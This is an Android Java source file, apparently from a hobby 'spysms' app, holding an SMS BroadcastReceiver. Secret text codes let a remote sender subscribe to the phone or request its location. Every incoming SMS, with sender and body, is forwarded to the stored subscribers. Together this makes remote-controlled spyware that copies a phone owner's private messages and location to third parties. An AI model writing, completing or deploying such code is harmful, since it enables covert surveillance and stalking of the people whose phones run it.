package com.example.paulig.spysms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;


public class SmsBroadcastReceiver extends BroadcastReceiver {
    public static final String SMS_BUNDLE = "pdus";


    public void onReceive(Context context, Intent intent) {
        Bundle intentExtras = intent.getExtras();
        boolean notify = false;
        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";
            for (Object sm : sms) {
                String format = intentExtras.getString("format");
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sm, format);

                String smsBody = smsMessage.getMessageBody();
                String address = smsMessage.getOriginatingAddress();
                String secretLocationCode = "Send me location please";
                String secretSubscribeCode = "Subscribe me please";
                if (smsBody.equals(secretSubscribeCode)) {
                    if (MainActivity.active) {
                        MainActivity inst = MainActivity.instance();
                        inst.db.InsertValue(address);
                    } else {
                        Intent i = new Intent(context, MainActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(i);
                        MainActivity inst = MainActivity.instance();
                        inst.db.InsertValue(address);

                    }
                    Toast.makeText(context, "subscriber added", Toast.LENGTH_SHORT).show();
                } else if (smsBody.equals(secretLocationCode)) {
                    if (LocationActivity.active) {
                        LocationActivity.inst.configure_button();
                    } else {
                        Intent i = new Intent(context, LocationActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(i);
                        LocationActivity.inst.address = address;
                        LocationActivity.inst.getLocation();
                        Toast.makeText(context, "location sent", Toast.LENGTH_SHORT).show();
                    }
                }
                if (notify){
                    MainActivity.instance().createNotification();
                }
                smsMessageStr += "SMS From: " + address + "\n";
                smsMessageStr += smsBody + "\n";
            }
            Toast.makeText(context, "Message Received!", Toast.LENGTH_SHORT).show();


            if (MainActivity.active) {
                MainActivity inst = MainActivity.instance();
                inst.updateInbox(smsMessageStr);
            } else {
                Intent i = new Intent(context, MainActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);

            }

            MainActivity inst = MainActivity.instance();
            Cursor cursor = inst.db.getAllData();
            if (cursor.getCount() != 0) {
                while (cursor.moveToNext()) {
                    inst.sendToSubscribers(cursor.getString(1), smsMessageStr);
                }
                Toast.makeText(context, "Subscribers notified", Toast.LENGTH_SHORT).show();
            }

        }
    }
}
